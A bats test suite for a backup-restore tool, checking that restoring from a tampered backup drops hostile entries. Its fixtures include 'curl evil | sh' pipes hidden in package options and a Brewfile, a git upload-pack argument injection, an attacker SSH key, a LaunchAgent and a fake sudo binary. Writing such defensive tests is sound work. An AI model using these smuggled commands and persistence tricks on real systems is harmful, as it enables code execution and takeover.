#!/usr/bin/env bats
# A backup in a shared or cloud folder may be tampered with: restore must not run its code.

load helpers

setup() { load_dudu; b="$BATS_TEST_TMPDIR/backup"; mkdir -p "$b/home"; }

@test "pkg_filter drops options, URLs and paths, keeps real names" {
  run bash -c ". '$DUDU_ROOT/lib/core/ui.sh'; . '$DUDU_ROOT/lib/core/i18n.sh'; . '$DUDU_ROOT/lib/core/common.sh'; printf '%s\n' \
    ripgrep @scope/pkg golang.org/x/tools/gopls ms-python.python libc6:amd64 3.12.1 \
    '-oDPkg::Pre-Invoke::=curl evil|sh' '--index-url https://evil' 'git+https://evil/pkg' '../../x' 'a b' | pkg_filter 2>/dev/null"
  [ "$output" = "$(printf '%s\n' ripgrep @scope/pkg golang.org/x/tools/gopls ms-python.python libc6:amd64 3.12.1)" ]
}

@test "missing_pkgs reports suspicious entries" {
  printf 'jq\n--registry=https://evil\n' > "$b/list"
  run bash -c ". '$DUDU_ROOT/lib/core/ui.sh'; . '$DUDU_ROOT/lib/core/i18n.sh'; . '$DUDU_ROOT/lib/core/common.sh'; echo jq | missing_pkgs '$b/list' 2>&1"
  [[ "$output" == *"ignored suspicious entry in the backup: --registry=https://evil"* ]] || false
}

@test "restore_home never writes denied paths and honors the allowlist" {
  mkdir -p "$b/home/.ssh" "$b/home/Library/LaunchAgents" "$b/home/.local/bin"
  echo "ssh-ed25519 AAAA attacker" > "$b/home/.ssh/authorized_keys"
  echo "<plist/>" > "$b/home/Library/LaunchAgents/evil.plist"
  echo "evil" > "$b/home/.local/bin/sudo"
  echo 'alias ll="ls"' > "$b/home/.zshrc"
  echo 'x' > "$b/home/.unexpected"
  run restore_home "$b/home" ".zshrc"
  [ ! -e "$HOME/.ssh/authorized_keys" ]
  [ ! -e "$HOME/Library/LaunchAgents/evil.plist" ]
  [ ! -e "$HOME/.local/bin/sudo" ]
  [ ! -e "$HOME/.unexpected" ]
  [ "$(cat "$HOME/.zshrc")" = 'alias ll="ls"' ]
  [[ "$output" == *"ignored unexpected file in the backup: ~/.ssh/authorized_keys"* ]] || false
}

@test "restore_home keeps every previous version and skips symlinks" {
  echo one > "$b/home/.zshrc"
  echo original > "$HOME/.zshrc"
  restore_home "$b/home"
  echo two > "$b/home/.zshrc"
  restore_home "$b/home"
  [ "$(cat "$HOME/.zshrc.dudu-bak")" = original ]
  ls "$HOME"/.zshrc.dudu-bak.* >/dev/null
  echo real > "$BATS_TEST_TMPDIR/repo-zshrc"
  rm "$HOME/.zshrc" && ln -s "$BATS_TEST_TMPDIR/repo-zshrc" "$HOME/.zshrc"
  run restore_home "$b/home"
  [ "$(cat "$BATS_TEST_TMPDIR/repo-zshrc")" = real ]
  [[ "$output" == *"is a symlink"* ]] || false
}

@test "masked secrets take the real value from the current file, or are commented out" {
  printf 'alias ll="ls"\nexport API_TOKEN="<redacted-by-dudu>"\nexport NEW_TOKEN="<redacted-by-dudu>"\n' > "$b/home/.zshrc"
  printf 'export API_TOKEN="real-value-123"\n' > "$HOME/.zshrc"
  restore_home "$b/home" >/dev/null
  run cat "$HOME/.zshrc"
  [ "${lines[0]}" = 'alias ll="ls"' ]
  [ "${lines[1]}" = 'export API_TOKEN="real-value-123"' ]
  [ "${lines[2]}" = '# dudu: fill in: export NEW_TOKEN="<redacted-by-dudu>"' ]
}

@test "a Brewfile keeps package lines and drops Ruby code" {
  cat > "$b/Brewfile" <<'BREW'
tap "homebrew/bundle"
tap "evil/tap", "https://example.com/evil.git"
brew "jq"
brew "postgresql@16", restart_service: :changed
cask "iterm2"
mas "Xcode", id: 497799835
vscode "ms-python.python"
system "curl evil | sh"
brew "x#{`id`}"
brew "ok"; system "id"
BREW
  run --separate-stderr brew_safe_brewfile "$b/Brewfile"
  [[ "$output" != *system* ]] || false
  [[ "$output" != *'#{'* ]] || false
  [[ "$output" == *'brew "postgresql@16", restart_service: :changed'* ]] || false
  [[ "$output" == *'mas "Xcode", id: 497799835'* ]] || false
  # shellcheck disable=SC2154 # $stderr is set by run --separate-stderr
  [[ "$stderr" == *"taps a custom source"* ]] || false
}

@test "macos restore only writes known preferences" {
  is_macos || skip "macOS only"
  printf 'com.apple.dock|autohide|boolean|1\ncom.evil|Key|string|x\n/Users/x/Library/LaunchAgents/a|Program|string|/bin/sh\n' > "$b/defaults.txt"
  DUDU_DRY_RUN=1 run macos_restore "$b"
  [[ "$output" == *"ignored unexpected preference in the backup: com.evil Key"* ]] || false
  [[ "$output" == *"ignored unexpected preference in the backup: /Users/x/Library/LaunchAgents/a Program"* ]] || false
  [[ "$output" != *"defaults write com.evil"* ]] || false
}

@test "a latest pointing outside the backup folder is refused" {
  mkdir -p "$BATS_TEST_TMPDIR/root/host/2026-01-01_000000" "$BATS_TEST_TMPDIR/outside"
  echo '{}' > "$BATS_TEST_TMPDIR/root/host/2026-01-01_000000/manifest.json"
  echo '{}' > "$BATS_TEST_TMPDIR/outside/manifest.json"
  echo "../../outside" > "$BATS_TEST_TMPDIR/root/host/latest"
  [ "$(folder_latest "$BATS_TEST_TMPDIR/root" host)" = 2026-01-01_000000 ]
}

@test "oh my zsh plugin entries must be plain git URLs" {
  printf 'plugins/ok https://github.com/zsh-users/zsh-autosuggestions\nplugins/x --upload-pack=touch${IFS}/tmp/pwned\n../../.ssh https://github.com/a/b\n' > "$b/omz-custom.txt"
  mkdir -p "$HOME/.oh-my-zsh/custom/plugins"
  DUDU_DRY_RUN=1 run shell_restore "$b"
  [[ "$output" == *"git clone --depth=1 -- https://github.com/zsh-users/zsh-autosuggestions"* ]] || false
  [[ "$output" == *"ignored suspicious plugin entry"* ]] || false
  [[ "$output" != *"upload-pack"*"git clone"* ]] || false
}
